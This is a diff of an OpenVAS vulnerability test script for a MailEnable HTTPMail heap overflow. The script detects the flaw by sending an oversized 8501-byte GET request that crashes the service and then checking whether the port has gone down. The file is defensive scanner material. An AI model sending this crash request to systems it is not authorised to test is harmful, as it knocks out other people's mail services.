@@ -1,5 +1,4 @@
 # OpenVAS Vulnerability Test
-# $Id: mailenable_httpmail_get_overflow.nasl 9348 2018-04-06 07:01:19Z cfischer $
 # Description: MailEnable HTTPMail Service GET Overflow Vulnerability
 #
 # Authors:
@@ -22,22 +21,11 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-tag_summary = "The target is running at least one instance of MailEnable -
-http://www.mailenable.com/ - that has a flaw in the HTTPMail service
-(MEHTTPS.exe) in the Professional and Enterprise Editions.  The flaw
-can be exploited by issuing an HTTP request exceeding 4045 bytes (8500
-if logging is disabled), which causes a heap buffer overflow, crashing
-the HTTPMail service and possibly allowing for arbitrary code
-execution.";
-
-tag_solution = "Upgrade to MailEnable Professional / Enterprise 1.19 or
-later.";
-
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.14656");
-  script_version("$Revision: 9348 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
+  script_version("2019-04-24T07:26:10+0000");
+  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
@@ -46,52 +34,57 @@ if (description)
   script_xref(name:"OSVDB", value:"6037");
   script_name("MailEnable HTTPMail Service GET Overflow Vulnerability");
   script_category(ACT_DENIAL);
-  script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("This script is Copyright (C) 2004 George A. Theall");
   script_family("Denial of Service");
-  script_require_ports("Services/www", 8080, 80 );
-  script_dependencies("global_settings.nasl", "gb_get_http_banner.nasl");
+  script_dependencies("gb_get_http_banner.nasl");
+  script_require_ports("Services/www", 8080, 80);
   script_mandatory_keys("MailEnable/banner");
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+
+  script_tag(name:"solution", value:"Upgrade to MailEnable Professional / Enterprise 1.19 or
+  later.");
+
+  script_tag(name:"summary", value:"The target is running at least one instance of MailEnable that has
+  a flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and Enterprise Editions.");
+
+  script_tag(name:"impact", value:"The flaw can be exploited by issuing an HTTP request exceeding 4045 bytes
+  (8500 if logging is disabled), which causes a heap buffer overflow, crashing the HTTPMail service and
+  possibly allowing for arbitrary code execution.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_vul");
+
   exit(0);
 }
 
-include("global_settings.inc");
 include("http_func.inc");
 
-# nb: HTTPMail defaults to 8080 but can run on any port. 
-port = get_http_port(default:8080);
+port = get_http_port(default:8080); # nb: HTTPMail defaults to 8080 but can run on any port.
 
-# Make sure banner's from MailEnable.
 banner = get_http_banner(port:port);
-if (debug_level) display("debug: banner =>>", banner, "<<.\n");
-if (!egrep(pattern:"^Server: .*MailEnable", string:banner)) exit(0);
+if(!banner || !egrep(pattern:"^Server: .*MailEnable", string:banner))
+  exit(0);
 
-host = http_host_name( port:port );
+soc = http_open_socket(port);
+if(!soc)
+  exit(0);
 
-# Try to bring it down.
+req = string(
+  # assume logging is disabled.
+  "GET /", crap(length:8501, data:"X"), " HTTP/1.0\r\n",
+  "Host: ", get_host_ip(), "\r\n",
+  "\r\n" );
+
+send(socket:soc, data:req);
+res = http_recv(socket:soc);
+http_close_socket(soc);
+if(!res) {
   soc = http_open_socket(port);
-  if (soc) {
-    req = string(
-      # assume logging is disabled.
-      "GET /", crap(length:8501, data:"X"), " HTTP/1.0\r\n",
-      "Host: ", host, "\r\n",
-      "\r\n"
-    );
-    if (debug_level) display("debug: sending =>>", req, "<<\n");
-    send(socket:soc, data:req);
-    res = http_recv(socket:soc);
+  if(!soc) {
+    security_message(port:port);
+    exit(0);
+  } else {
     http_close_socket(soc);
-    if (res) {
-      if (debug_level) display("debug: res =>>", res, "<<\n");
-    }
-    else {
-     soc = http_open_socket(port);
-     if (!soc)
-       security_message(port);
-     else
-       http_close_socket(soc);
-
-    }
   }
+}
+
+exit(99);
